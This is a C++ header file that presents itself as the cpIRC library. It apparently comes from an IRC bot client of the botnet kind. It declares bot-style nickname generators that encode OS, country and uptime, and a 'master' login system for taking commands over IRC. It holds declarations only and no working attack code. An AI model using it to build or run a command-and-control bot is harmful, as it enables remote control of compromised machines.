/*
	cpIRC - C++ class based IRC protocol wrapper
	Copyright (C) 2003 Iain Sheppard

	This library is free software; you can redistribute it and/or
	modify it under the terms of the GNU Lesser General Public
	License as published by the Free Software Foundation; either
	version 2.1 of the License, or (at your option) any later version.

	This library is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
	Lesser General Public License for more details.

	You should have received a copy of the GNU Lesser General Public
	License along with this library; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

	Contacting the author:
	~~~~~~~~~~~~~~~~~~~~~~

	email:	iainsheppard@yahoo.co.uk
	IRC:	#magpie @ irc.quakenet.org
*/

#if !defined(IRC_H__INCLUDED_)
#define IRC_H__INCLUDED_

#include <stdarg.h>
#pragma comment(lib,"Gdi32")
#pragma comment(lib,"ws2_32")

enum {			// nick types
	N_OS,		// [XP-#####], [2K-#####], etc..
	N_RNDLTR,	// mtbylarfa, byduplnbk, etc...
	N_RNDCTY,	// [USA-####], etc...
	N_BOX,		//
	N_MINE,		// [00|USA|####] (the first 2 numbers are uptime)
};

struct irc_reply_data
{
	char* nick;
	char* ident;
	char* host;
	char* target;
};

struct irc_command_hook
{
	char* irc_command;
	int (*function)(char*, irc_reply_data*, void*);
	irc_command_hook* next;
};

struct logged_in
{
	char nick[MAX_NICKLEN];
	char ident[MAX_NICKLEN];
	char host[MAX_HOSTNAME];
};
DWORD WINAPI PingTimeoutThread(LPVOID param);

class IRC
{
public:
	IRC();
	~IRC();
	int start(char* server, int port, char* nick, char* user, char* name, char* pass);
	void disconnect();
	int notice(char* target, char* message, ...);
	int pmsg(char* target, char* message, ...);
	int privmsg_filter(char* target, char *filter, char* message, ...);
	int join(char* channel);
	int join(char* channel, char* pass);
	int part(char* channel);
	//int kick(char* channel, char* nick);
	//int kick(char* channel, char* nick, char* message);
	int mode(char* modes);
	int mode(char* channel, char* modes, char* targets);
	int nick(char* newnick);
	int quit(char* quit_message, ...);
	int raw(char* data);
	void hook_irc_command(char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*));
	int message_loop();
	char* current_nick();
	bool  is_connected(void);
	bool  should_connect(void);
	char* nickgen(DWORD NickType, int NickLen);
	char* get_ip(void);
	SOCKET get_sock(void);

	void clear_logins(void);
	int add_login(const char* nick, const char* ident, const char* host);
	int del_login(const char* nick, const char* ident, const char* host);
	BOOL del_login(int num);
	BOOL is_logged_in(const char* nick, const char* ident, const char* host);
	BOOL has_master(void);
	void list_logins(char* target);
	int privmsg_masters(char* message, ...);
	int get_nicktime(void) { return nicktime; }

private:
	char* nickgen_mine(void);
	char* nickgen_prefix(void);
	char* nickgen_os(void);
	char* nickgen_rndltr(void);
	char* nickgen_rndcountry(void);
	char* nickgen_curbox(void);
	
	int isend(int socket, char *data, ...);
	void call_hook(char* irc_command, char*params, irc_reply_data* hostd);
	/*void call_the_hook(irc_command_hook* hook, char* irc_command, char*params, irc_host_data* hostd);*/
	void parse_irc_reply(char* data);
	void split_to_replies(char* data);
	void insert_irc_command_hook(irc_command_hook* hook, char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*));
	void delete_irc_command_hook(irc_command_hook* cmd_hook);
	int isock;

	bool connected;
	bool bconnect;
	char* cur_nick;
	char ip[MAX_IP];
	irc_command_hook* hooks;
	int nicklen;
	int nicktime;
	
	BOOL prefixmrc;
	BOOL prefixprv;
	BOOL prefixdialup;

};

#endif // IRC_H__INCLUDED_

